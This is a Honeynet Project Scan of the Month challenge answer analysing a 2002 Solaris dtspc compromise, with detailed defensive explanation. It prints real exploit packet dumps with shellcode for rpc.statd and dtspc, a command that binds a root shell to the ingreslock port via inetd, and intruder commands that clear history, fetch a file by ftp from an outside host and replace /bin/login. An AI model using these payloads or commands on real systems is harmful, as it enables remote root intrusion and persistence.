@@ -1,0 +1,398 @@
+<!DOCTYPE doctype PUBLIC "-//w3c//dtd html 4.0 transitional//en"><html><head>
+   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+   <meta name="Author" content="Jason Testart">
+   <meta name="GENERATOR" content="Mozilla/4.78 [en] (X11; U; Linux 2.4.7-10 i686) [Netscape]">
+   <title>Jason Testart's Scan 20 answers</title></head>
+
+<body text="#000000" bgcolor="#ffffff" link="#0000ee" vlink="#551a8b" alink="#ff0000">
+
+<center>
+<h2>
+Honeynet Project Scan of the Month - April 2002</h2></center>
+
+<center>
+<h2>
+Scan 20</h2></center>
+
+<center>By: Jason Testart, SSCP &lt;jtestart@ryerson.ca&gt;</center>
+
+<p><br>
+<br>
+<br>
+</p><p><font color="#999999">1. What is a NOP slide, and how is this one different
+from the NOP slide in the rpc.statd exploit in Scan10?</font>
+<br> 
+</p><blockquote>A NOP slide is a series of "No Operation" assembly language
+instructions padding the beginning of an overflow buffer containing arbitrary
+code chosen by the attacker (usually shellcode).
+<p>Buffer-overflows involve a function return address on the stack being
+re-written to a value chosen by attacker.  The new address would ideally
+point right at the beginning of the shellcode in the buffer, but this address
+is difficult to determine.  A work-around is to pad the beginning
+of the buffer with NOP instructions so that as long as the overwritten
+return address points somewhere before the shellcode in the buffer, the
+instruction pointer will "slide" along the no-operation instructions finding
+its way to the shellcode.
+<br> 
+</p><blockquote><b><u>rpc.statd exploit</u></b>
+<pre>=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
+12/09-07:17:10.595325 207.19.5.25:710 -&gt; 172.16.1.104:931
+UDP TTL:49 TOS:0x0 ID:48712 
+Len: 1084
+0C 72 54 F5 00 00 00 00 00 00 00 02 00 01 86 B8  .rT.............
+00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 20  ............... 
+3A 32 3F ED 00 00 00 09 6C 6F 63 61 6C 68 6F 73  :2?.....localhos
+74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+00 00 00 00 00 00 00 00 00 00 03 E7 18 F7 FF BF  ................
+18 F7 FF BF 19 F7 FF BF 19 F7 FF BF 1A F7 FF BF  ................
+1A F7 FF BF 1B F7 FF BF 1B F7 FF BF 25 38 78 25  ............%8x%
+38 78 25 38 78 25 38 78 25 38 78 25 38 78 25 38  8x%8x%8x%8x%8x%8
+78 25 38 78 25 38 78 25 32 33 36 78 25 6E 25 31  x%8x%8x%236x%n%1
+33 37 78 25 6E 25 31 30 78 25 6E 25 31 39 32 78  37x%n%10x%n%192x
+25 6E 90 90 90 90 90 90 90 90 90 90 90 90 90 90  %n..............
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+<b><font color="#ff0000">90</font></b> 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 31 C0  ..............1.
+EB 7C 59 89 41 10 89 41 08 FE C0 89 41 04 89 C3  .|Y.A..A....A...
+FE C0 89 01 B0 66 CD 80 B3 02 89 59 0C C6 41 0E  .....f.....Y..A.
+99 C6 41 08 10 89 49 04 80 41 04 0C 88 01 B0 66  ..A...I..A.....f
+CD 80 B3 04 B0 66 CD 80 B3 05 30 C0 88 41 04 B0  .....f....0..A..
+66 CD 80 89 CE 88 C3 31 C9 B0 3F CD 80 FE C1 B0  f......1..?.....
+3F CD 80 FE C1 B0 3F CD 80 C7 06 2F 62 69 6E C7  ?.....?..../bin.
+46 04 2F 73 68 41 30 C0 88 46 07 89 76 0C 8D 56  F./shA0..F..v..V
+10 8D 4E 0C 89 F3 B0 0B CD 80 B0 01 CD 80 E8 7F  ..N.............
+FF FF FF 00                                      ....</pre>
+
+<p><br><b><u>dtspc exploit</u></b>
+</p><pre>01/08-10:46:04.378306 208.61.1.160:3592 -&gt; 172.16.1.102:6112
+TCP TTL:48 TOS:0x0 ID:41388 IpLen:20 DgmLen:1500 DF
+***AP*** Seq: 0xFEE2C115  Ack: 0x5F66192F  Win: 0x3EBC  TcpLen: 32
+TCP Options (3) =&gt; NOP NOP TS: 463986683 4158792 
+30 30 30 30 30 30 30 32 30 34 31 30 33 65 30 30  0000000204103e00
+30 31 20 20 34 20 00 00 00 31 30 00 80 1C 40 11  01  4 ...10...@.
+80 1C 40 11 10 80 01 01 80 1C 40 11 80 1C 40 11  ..@.......@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+<b><font color="#ff0000">80 1C 40 11</font></b> 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 20 BF FF FF  ..@...@...@. ...
+20 BF FF FF 7F FF FF FF 90 03 E0 34 92 23 E0 20   ..........4.#. 
+A2 02 20 0C A4 02 20 10 C0 2A 20 08 C0 2A 20 0E  .. ... ..* ..* .
+D0 23 FF E0 E2 23 FF E4 E4 23 FF E8 C0 23 FF EC  .#...#...#...#..
+82 10 20 0B 91 D0 20 08 2F 62 69 6E 2F 6B 73 68  .. ... ./bin/ksh
+20 20 20 20 2D 63 20 20 65 63 68 6F 20 22 69 6E      -c  echo "in
+67 72 65 73 6C 6F 63 6B 20 73 74 72 65 61 6D 20  greslock stream 
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root 
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 22 3E 2F  /bin/sh sh -i"&gt;/
+74 6D 70 2F 78 3B 2F 75 73 72 2F 73 62 69 6E 2F  tmp/x;/usr/sbin/
+69 6E 65 74 64 20 2D 73 20 2F 74 6D 70 2F 78 3B  inetd -s /tmp/x;
+73 6C 65 65 70 20 31 30 3B 2F 62 69 6E 2F 72 6D  sleep 10;/bin/rm
+20 2D 66 20 2F 74 6D 70 2F 78 20 41 41 41 41 41   -f /tmp/x AAAAA
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+41 41 41 41 41 41 41 41                          AAAAAAAA</pre>
+</blockquote>
+
+<p><br>The rpc.statd exploit uses the hex value "0x90" as the NOP instruction
+where this exploit uses the value "0x801C4011".  The hex value "0x90"
+represents the "nop" assembly language instruction on Intel.  Since
+the SPARC, being RISC, has a "reduced" instruction set, the nop instruction 
+must be implemented using the "xor" instruction.  The value "0x80"
+represents the "xor" assembly language instruction where "1C 40 11" are
+its three arguments in this case.</p></blockquote>
+
+<p><br><font color="#999999">2. The attack was on 08 Jan, 2002. Would Snort
+have generated an alert then for the attack?</font>
+<br> 
+</p><blockquote>The answer is no. Browsing the snort CVS tree on Sourceforge,
+I found that the rule to catch this exploit was added to the experimental
+snort ruleset (rev. 1.6) on 15 Jan, 2002, and wasn't added to the exploit
+ruleset until 02 Mar, 2002 (rev. 1.29).  So unless a snort user added
+a similar rule rule manually, no alert would be generated.</blockquote>
+
+<blockquote>The attack would have shown the portscan of port 6112 which
+is automatically suspicious given the vulnerability was two months old
+at the time.</blockquote>
+
+<p><br><font color="#999999">3. In the exploit code, the command "/bin/sh
+sh -i" is given, what is its purpose, and why is 'sh' shown twice?</font>
+</p><blockquote>The string "/bin/sh sh -i" is actually the last field of a
+configuration file entry for inetd.  The exploit code creates a inetd
+configuration file named "/tmp/x" which contains a single entry, then starts-up
+a standalone inetd process that uses this config file.  The single
+entry instructs inetd to listen for connections on the ingreslock tcp port,
+and to invoke "/bin/sh sh -i" as root when a connection is established.
+<p>Since inetd is not associated with a terminal, the invocation of /bin/sh
+is not interactive.  The second "sh" is the actual interactive shell
+used by the attacker.</p></blockquote>
+
+<p><br><font color="#999999">4. The attacker executed a variety of commands
+on the hacked Solaris box. Which commands were automated by the exploit,
+which commands were manual by the attacker himself?</font>
+<br> 
+</p><blockquote>The automated commands by the exploit to set-up the backdoor
+are:
+<blockquote>
+<pre><tt>/bin/ksh    -c  echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x;/usr/sbin/inetd -s /tmp/x;sleep 10;/bin/rm -f /tmp/x</tt></pre>
+</blockquote>
+The shell commands executed by the attacker using the backdoor are:</blockquote>
+
+<blockquote>
+<blockquote>
+<pre><tt>uname -a;
+ls -l /core /var/dt/tmp/DTSPCD.log;
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;
+export PATH;
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+w
+unset HISTFILE
+cd /tmp
+mkdir /usr/lib
+mv /bin/login /usr/lib/libfl.k
+ftp 64.224.118.115
+ls
+chmod 555 sun1
+mv sun1 /bin/login</tt></pre>
+</blockquote>
+It is possible that the commands issued before the "w" command using the
+backdoor were automated since they were sent all at once, separated by
+a semi-colon.</blockquote>
+
+<p><br><font color="#999999">5. What is sun1, and how does it work?</font>
+<br> 
+</p><blockquote>To determine what sun1 actually was, I needed to extract the
+binary from the snort log.  To do this, I used Ethereal's "Follow
+TCP Stream" feature on the FTP-DATA session between the honeypot and the
+ftp site 64.224.118.115.
+<p>Once I had the file sun1, I ran the following commands (on Solaris 8
+sun4u):
+</p><blockquote><tt>% file sun1</tt>
+<br><tt>can't read ELF header</tt>
+<br><tt>sun1:</tt>
+<br><tt>% elfdump sun1</tt>
+<br><tt>sun1: elf_getehdr failed: Format error: shdr table truncated</tt></blockquote>
+Copying the file to a Linux machine, I ran the following:
+<blockquote> 
+<br><tt>$ file sun1</tt>
+<br><tt>sun1: ELF 32-bit MSB executable, SPARC, version 1, statically linked,
+stripped</tt>
+<br><tt>$ readelf -a sun1</tt>
+<br><tt>ELF Header:</tt>
+<br><tt>  Magic:   7f 45 4c 46 01 02 01 00 00 00 00 00 00
+00 00 00</tt>
+<br><tt>  Class:                            
+ELF32</tt>
+<br><tt>  Data:                             
+2's complement, big endian</tt>
+<br><tt>  Version:                          
+1 (current)</tt>
+<br><tt>  OS/ABI:                           
+UNIX - System V</tt>
+<br><tt>  ABI Version:                      
+0</tt>
+<br><tt>  Type:                             
+EXEC (Executable file)</tt>
+<br><tt>  Machine:                          
+Sparc</tt>
+<br><tt>  Version:                          
+0x1</tt>
+<br><tt>  Entry point address:              
+0x10074</tt>
+<br><tt>  Start of program headers:         
+52 (bytes into file)</tt>
+<br><tt>  Start of section headers:         
+89744 (bytes into file)</tt>
+<br><tt>  Flags:                            
+0x0</tt>
+<br><tt>  Size of this header:              
+52 (bytes)</tt>
+<br><tt>  Size of program headers:          
+32 (bytes)</tt>
+<br><tt>  Number of program headers:        
+2</tt>
+<br><tt>  Size of section headers:          
+40 (bytes)</tt>
+<br><tt>  Number of section headers:        
+20</tt>
+<br><tt>  Section header string table index: 18</tt>
+<br><tt>readelf: Error: Unable to read in 800 bytes of section headers</tt>
+<p><tt>Program Headers:</tt>
+<br><tt>  Type          
+Offset   VirtAddr   PhysAddr   FileSiz MemSiz 
+Flg Align</tt>
+<br><tt>  LOAD          
+0x000074 0x00010074 0x00000000 0x098d2 0x098d2 R E 0x10000</tt>
+<br><tt>  LOAD          
+0x009948 0x00029948 0x00000000 0x00ae5 0x00dd8 RWE 0x10000</tt>
+</p><p><tt>There is no dynamic segment in this file.</tt>
+<br><tt>Segmentation fault</tt></p></blockquote>
+I'm no ELF expert, so this was pretty useless to me.  For further
+hints, I used the good old fall-back "strings" command to get some hints
+on what this does.  The only string that I found interesting in the
+output was "/usr/lib/libfl.k".
+<p>Of course, we notice that the intruder copied the orginal login program
+to /usr/lib/libfl.k before putting sun1 in it's place (with perms 555 I
+might add).  How could a login trojan not be SUID?
+</p><p>I decided to recreate the steps that the intruder did on a test machine,
+in a controlled environment (with a firewall blocking and logging inbound/outbound
+traffic, and lsof ready to go).
+</p><p>As a non-priviliged user, I first did the following:
+</p><blockquote><tt>% truss ./sun1</tt>
+<br><tt>execve("./sun1", 0xFFBEFDBC, 0xFFBEFDC4)  argc = 1</tt>
+<br><tt>execve("/usr/lib/libfl.k", 0xFFBEFDBC, 0xFFBEFDC4) Err#2 ENOENT</tt>
+<br><tt>_exit(1)</tt></blockquote>
+I then followed the steps of the attacker and ran sun1 again and the exec
+of /usr/lib/libfl.k succeeded.   Remember that /usr/lib/libfl.k
+is the original login program.  It is my belief that the purpose of
+sun1 is to simply set-off  alarms (like MD5 checks, Tripwire, etc...). 
+Why else would you replace the login program with a non-SUID program that
+immediately execs the original login program?
+<p>Since I don't know much about ELF, I might be missing a big piece of
+the puzzle.  I'm paranoid that there is hidden code, but I doubt that
+because the sun1 file is 89K which I think is small for a statically linked
+binary.</p></blockquote>
+
+<p><br><font color="#999999">6.What did you learn from this exercise?</font>
+<br> 
+</p><blockquote>I learned how buffer overflows work and I learned more about
+assembly language programming.</blockquote>
+
+<p><br><font color="#999999">7.How long did this challenge take you?</font>
+<br> 
+</p><blockquote>This challenge probably took me about 10 hours.  Most
+of my time was spent understanding how buffer overflows work and re-orienting
+myself with assembly language programming.  I also spent alot of time
+convincing myself that the sun1 binary was simply doing an exec of the
+original login.  The truss output wasn't compelling enough to overcome
+my paranoia.</blockquote>
+
+<p><br><font color="#999999">Bonus Question:</font>
+<br><font color="#999999">One of the commands executed during the attack
+is</font>
+</p><p><font color="#999999">echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep
+-v grep|awk '{print $2}'`</font>
+</p><p><font color="#999999">What is the purpose of this command and what does
+'BD' stand for?</font>
+<br> 
+</p><blockquote>All Solaris exploits that I have seen install a backdoor by
+starting another standalone inetd process that invokes a root shell on
+a connection to the ingreslock port.  The config file for the standalone
+inetd process is typically created in /tmp.  This command returns
+the process ID of a standalone inetd process with config file /tmp/x, in
+other words, the PID of the backdoor process.  BD stands for "backdoor".</blockquote>
+
+<br> 
+</body></html>
